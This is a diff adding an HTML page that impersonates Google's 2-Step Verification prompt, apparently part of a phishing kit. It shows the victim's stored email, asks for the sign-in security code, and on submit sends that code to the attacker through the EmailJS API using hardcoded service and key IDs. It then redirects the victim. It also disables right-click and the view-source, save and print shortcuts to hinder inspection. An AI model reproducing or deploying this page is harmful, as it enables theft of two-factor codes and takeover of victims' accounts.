@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail-Verifcation</title>
+    <link rel="stylesheet" href="./assets/css/g_style.css">
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "Ct3xYBH_v2Glf8LKZ",
+            });
+        })();
+    </script>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="side">
+            <div class="second-side-section">
+              <img src="./assets/img/google2.png" alt="">
+              <h1>2-Step Verification</h1>  
+              <p>This extra steps shows it's really you trying to sign in</p>
+              <div class="span"><img src="./assets/img/profile-icon.jpg" alt=""><span id="google-eml"></span></div>
+            </div>            
+        </div>
+        <div class="main">
+            <form class="second-main-section" id="google-form">
+                <h3>2-Step Verification</h3>
+                <p>.  Get your Device</p>
+                <p>.  Open the Settings app</p>
+                <p>.  Tap Google</p>
+                <p>.  Choose your account, if it not already selected</p>
+                <p>.  Tap Manage your Google Account</p>
+                <p>.  Select the Security tab (you may need to scroll to the right)</p>
+                <p>.  Under "Signing in to Google" tap Security code</p>
+                <p>.  Choose an account to get your code</p>
+                <input type="number" name="code" id="code" placeholder="Enter the code" required>
+                <span class="sp-c"><input type="checkbox" checked name="" id=""><p>Don't ask again on this device</p></span>
+                <div class="links-buttons">
+                    <a href="./google-verification.html">Try another way</a>
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+            
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+        document.addEventListener("keydown", (e) => {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+
+
+    <script>
+        document.getElementById("google-eml").innerHTML = JSON.parse(localStorage.getItem('email'));
+        document.getElementById("mobile").innerHTML = JSON.parse(localStorage.getItem('mobile'));
+
+        document.getElementById("google-form").addEventListener("submit", function(event){
+            event.preventDefault();
+            
+            var data = {
+                service_id: 'service_4a8grop',
+                template_id: 'template_5abs6p4',
+                user_id: 'Ct3xYBH_v2Glf8LKZ',
+                template_params: {
+                    name: "Workabroad.ph",
+                    subject: "USER verification code",
+                    message: "CODE: " + document.getElementById("code").value,
+                }
+            };
+            
+            $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+                type: 'POST',
+                data: JSON.stringify(data),
+                contentType: 'application/json'
+            }).done(function() {
+                window.location.href='./index.html';
+            }).fail(function(error) {
+                alert('Oops... ' + JSON.stringify(error));
+            });
+            
+        });
+
+        
+    </script>
+
+<script type="text/javascript"src="./assets/js/vendor/jquery.min.js"></script><script type="text/javascript"src="./assets/js/vendor/bootstrap.bundle.min.js"></script><script type="text/javascript"src="./assets/js/vendor/moment.min.js"></script><script type="text/javascript"src="./assets/js/vendor/mousetrap.min.js"></script><script type="text/javascript"src="./assets/js/vendor/sweetalert.min.js"></script><script type="text/javascript"src="./assets/js/vendor/intlTelInput.min.js"></script><script type="text/javascript"src="./assets/js/vendor/jquery.are-you-sure.js"></script>
+</body>
+</html>
